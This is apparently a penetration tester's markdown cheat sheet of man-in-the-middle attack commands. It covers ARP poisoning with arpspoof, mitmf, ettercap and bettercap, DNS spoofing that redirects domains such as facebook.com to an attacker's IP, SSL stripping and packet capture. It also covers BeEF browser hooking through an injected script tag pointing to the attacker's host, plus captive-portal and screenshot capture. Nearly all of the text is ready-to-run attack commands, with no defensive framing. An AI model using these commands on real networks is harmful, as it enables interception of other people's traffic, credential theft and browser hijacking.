# ARP Spoofing
- `arpspoof`:

```bash
# Set IP Packet forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
# to check if its working 
sudo iptables -t nat -v -L PREROUTING

sudo arpspoof -i $INTERFACE -t $ROUTERIP $VICTIMIP # tells router that victim's address is mine. (poisoning router)
sudo arpspoof -i $INTERFACE -t $VICTIMIP $ROUTERIP # tells vitcim that our address is the router. (poisoning vitcim)

driftnet -i $INTERFACE # store all the packets for later analysis
wireshark 
```

- `mitmf`: 
```bash
# get the gateway with netstat -nr
sudo mitmf -i $INTERFACE --spoof --arp --gateway $GATEWAY --target $IP
```

- `Ettercap`: 
```bash
ettercap -T -q -i $INTERFACE -M arp:remote /target_ip// /gateway_ip//
```

- `Bettercap`: 
```bash
sudo bettercap -iface $INTERFACE

net.recon on
set arp.spoof.targets $IP
arp.spoof on

net.show
```

---
# DNS Spoofing
- `mitmf`: 
```bash
sudo mitmf -i $INTERFACE --spoof --dns --arp  --gateway $GATEWAY --target $IP --hsts
```

- `bettercap`: 

```dns
# Contents of /tmp/dns.hosts
192.168.1.50 facebook.com
192.168.1.50 *.facebook.com
```

```bash
sudo bettercap -iface $INTERFACE

net.recon on
set dns.spoof.domains xyz.com, *.xyz.com
set dns.spoof.address 192.168.1.50 # your IP

# or with a dns file
# set dns.spoof.hosts /tmp/dns.hosts 
# dns.spoof on

set arp.spoof.targets $IP
arp.spoof on

dns.spoof on

set https.proxy.sslstrip true 
http.proxy on
```


- `ettercap`: 
/etc/ettercap/etter.dns
```dns
xyz.com A IP
*.xyz.com A IP
```

```bash
ettercap -T -q -i $INTERFACE -M arp:remote -P dns_spoof /Target_ip// /Gateway_ip// 
sslstrip -l 10000 -f &
```


- `dnschef`: 
```bash
dnschef --fakedomain xyz.com=$IP --fakeip $IP --nameserver $DNS_SERVER
# the $DNS_SERVER should be a dns server to forward other requests to. like 8.8.8.8 or 1.1.1.1
```

---
# Hooking After MiTM with ARP
- BeEF
```bash
beef-xss # or beef
# add the <script src="http://ip:3000/hook.js"> to your html code to the http server
```

- Captive Portal
```bash
sudo mitmf -i $INTERFACE --spoof --arp --gateway $GATEWAY --captive --portalurl http://yoururl
```

- Take Screenshot
```bash
sudo mitmf -i $INTERFACE --spoof --arp --gateway $GATEWAY --upsidedownternet --screen --interval 20
```
---
